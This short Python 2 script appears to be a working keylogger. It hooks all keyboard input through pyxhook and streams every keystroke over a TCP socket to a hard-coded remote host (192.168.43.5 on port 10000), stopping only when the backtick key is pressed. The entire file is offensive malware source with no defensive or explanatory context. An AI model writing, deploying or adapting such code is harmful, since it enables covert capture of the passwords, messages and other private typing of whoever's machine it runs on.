import pyxhook
import socket
import platform

print platform.system()

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = "192.168.43.5"
port = 10000
sock.connect((host,port))

def key_logger(event):
   data = str(event.Key)
   sock.sendall(data)
   if event.Ascii == 96:
      hook.cancel()

hook = pyxhook.HookManager()
hook.KeyDown = key_logger
hook.HookKeyboard()
hook.start()
